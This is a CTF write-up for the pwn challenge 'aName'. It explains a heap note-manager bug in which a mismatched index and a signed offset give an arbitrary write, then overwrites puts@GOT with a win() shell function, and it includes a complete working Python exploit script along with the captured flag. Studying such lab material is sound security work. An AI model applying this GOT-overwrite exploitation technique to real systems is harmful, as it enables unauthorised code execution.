---
title: aName
date: 2026-06-28
tags:
- pwn
- MntcrlCTF-2026
---

- **Challenge:** aName
- **Category:** Pwn
- **Flag:** `mntcrl{y0u_f0uNd_th3_n4m3_0f_th3_ch411_1_th1nk_9582d084bf19bf6a}`

---

## My initial read / first impressions

We are given a pwn challenge with the description:

```text
OH! This challenge has a name!
```

The provided zip has a pretty normal heap-note setup:

- `chall`
- `lib/libc.so.6`
- `lib/ld-linux-x86-64.so.2`
- `Dockerfile`
- `run.sh`
- `compose.yml`

The `run.sh` is important because it shows where the flag ends up:

```sh
echo $FLAG > /tmp/flag.txt
export FLAG=""

LINKER="./lib/ld-linux-x86-64.so.2"
LIB="./lib"

exec $LINKER --library-path $LIB ./chall
```

So if we can get code execution / a shell, the command we want is just:

```sh
cat /tmp/flag.txt
```

Running the binary gives a note menu:

```text
1) Create note
2) Delete note
3) Edit note
4) Read note
5) exit
~>
```

There is also a hidden `win()` function in the binary which just calls:

```c
system("/bin/sh");
```

So the goal is pretty clearly to abuse the note manager until we can redirect execution to `win()`.

## Binary protections / useful info

The binary is not PIE:

```text
Type: EXEC (Executable file)
```

So code and GOT addresses are stable.

The useful addresses are:

```text
win      = 0x4012e9
puts@got = 0x404008
```

This makes the exploit a lot nicer because we do not need a libc leak. If we can get an arbitrary write, we can just overwrite `puts@GOT` with `win`.

The binary also has a bunch of menu prints using `puts`, so once `puts@GOT` becomes `win`, the next printed menu line spawns `/bin/sh`.

## Reversing the note structure

The program has a global `notes` pointer and a global note count.

During init, it allocates an array for note pointers:

```c
notes = calloc(1, 0x1e0);
```

Each note struct is allocated with size `0x30`.

In `create_note`, it does something like:

```c
n_note++;
notes[n_note] = calloc(1, 0x30);
scanf("%31s", notes[n_note] + 2);
scanf("%u", &size);
notes[n_note]->content = calloc(1, size);
read(0, notes[n_note]->content, size);
```

The content pointer is stored at offset `0x28` inside the note struct.

So the important layout is basically:

```text
note struct
+0x02 title
+0x28 content pointer
```

When I created two notes of size `0x20`, the heap layout was very clean:

```text
note0 struct
note0 content
note1 struct
note1 content
```

That layout is what makes the exploit straightforward.

## The vulnerability

The bug is in `edit_note`.

The function asks for a note index, a new size, an offset, and then content. But it has a really funny mistake.

It reallocs the content buffer of the note index we chose:

```c
notes[idx]->content = realloc(notes[idx]->content, new_dim);
```

But when it actually writes the new content, it does not use `idx`.

It writes into `notes[n_note]->content`, which is the latest created note:

```c
read(0, notes[n_note]->content + offset, new_dim + 8);
```

That means if we create two notes and then edit note `0`, the program reallocs note `0`, but writes into note `1`.

So note `0` is basically just the note we edit to trigger the bug, and note `1` becomes the write target.

Even better, the offset is signed and there is no proper bounds check. So we can write backwards from note 1's content buffer into note 1's struct.

Since note 1's content pointer is at `note1_struct + 0x28`, and note 1's content buffer comes right after the struct, the content pointer is exactly `0x18` bytes before the start of the content buffer.

So with this offset:

```text
-24
```

we can overwrite note 1's own content pointer.

That gives us a clean arbitrary write primitive:

1. Use the edit bug to overwrite `note1->content`.
2. Point `note1->content` at any address.
3. Use the edit bug again with offset `0`.
4. The write now goes to that address.

## The exploit plan

The plan is:

1. Create note 0 with size `0x20`.
2. Create note 1 with size `0x20`.
3. Edit note 0, but write backwards into note 1's struct.
4. Overwrite `note1->content` with `puts@GOT`.
5. Edit note 0 again.
6. This time the buggy write goes to `note1->content`, which now means `puts@GOT`.
7. Write the address of `win` into `puts@GOT`.
8. The next `puts()` call becomes `win()`.
9. `win()` runs `/bin/sh`.
10. Send `cat /tmp/flag.txt`.

The only slightly weird thing is the edit size input.

The program scans the new size in a broken way, and the `realloc` can fail or do weird stuff. But that does not really matter for this exploit because we do not care about the chosen note's content pointer after the edit. We only care that the final `read()` happens.

Since this is over a socket, `read()` can return after receiving the bytes we send, so we do not need to actually satisfy some giant size.

## Solution Script

Here is the final solve script:

```python
import socket
import ssl
import struct
import time
import re

HOST = "aname-fdcfcc73f1e2.c.mntcrl.it"
PORT = 443

PUTS_GOT = 0x404008
WIN = 0x4012e9

def p64(x):
    return struct.pack("<Q", x)

raw = socket.create_connection((HOST, PORT))
io = ssl.create_default_context().wrap_socket(raw, server_hostname=HOST)

def send(data, delay=0.08):
    if isinstance(data, str):
        data = data.encode()
    io.sendall(data)
    time.sleep(delay)

def create(title, content):
    send("1\n")
    send(title + b"\n")
    send(str(len(content)) + "\n")
    send(content)

create(b"aa", b"A" * 0x20)
create(b"bb", b"B" * 0x20)

send("3\n")
send("0\n")
send("0\n")
send("-24\n")
send(p64(PUTS_GOT))

send("3\n")
send("0\n")
send("0\n")
send("0\n")
send(p64(WIN), 0.2)

send("cat /tmp/flag.txt\n", 0.5)

io.settimeout(2)
out = b""

try:
    while True:
        chunk = io.recv(4096)
        if not chunk:
            break
        out += chunk
except Exception:
    pass

text = out.decode("latin1", errors="ignore")
print(text)

match = re.search(r"mntcrl\{[^}\n]+\}", text)
if match:
    print(f"[+] FLAG: {match.group(0)}")
```

Running it:

```bash
python solve.py
```

Output:

```text
1) Create note
2) Delete note
3) Edit note
4) Read note
5) exit
~> Enter a title: Enter the size of the note: Enter the content of the note: Note created successfully!
1) Create note
2) Delete note
3) Edit note
4) Read note
5) exit
~> Enter a title: Enter the size of the note: Enter the content of the note: Note created successfully!
1) Create note
2) Delete note
3) Edit note
4) Read note
5) exit
~> Insert the note index: Insert new dim: Enter the offset from which you want to start writing: Enter the content: 1) Create note
2) Delete note
3) Edit note
4) Read note
5) exit
~> Insert the note index: Insert new dim: Enter the offset from which you want to start writing: Enter the content: mntcrl{y0u_f0uNd_th3_n4m3_0f_th3_ch411_1_th1nk_9582d084bf19bf6a}
```

And that gives the flag.

## Final thoughts

This was a really clean GOT overwrite challenge. The main trick was not overcomplicating it.

At first, the note manager looks like it might need a heap leak or libc leak, especially because there is a delete function and a libc is provided. But since the binary has a `win()` function and no PIE, the exploit is much simpler.

The entire bug comes down to this mismatch:

```text
realloc selected note
write into latest note
```

Once I noticed that, the rest was just shaping the heap with two notes and using a negative offset to turn it into an arbitrary write.
